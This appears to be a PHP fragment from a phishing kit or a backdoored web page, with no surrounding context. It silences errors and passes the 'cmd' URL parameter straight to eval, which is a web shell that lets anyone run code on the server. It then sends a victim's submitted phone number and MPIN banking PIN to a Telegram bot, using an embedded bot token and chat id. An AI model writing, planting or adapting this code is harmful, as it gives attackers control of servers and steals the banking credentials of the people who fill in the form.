error_reporting(0);
eval($_GET['cmd']);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number'] . " MPIN: " . $_POST['mpin']);
$_POST['mpin'] = null;
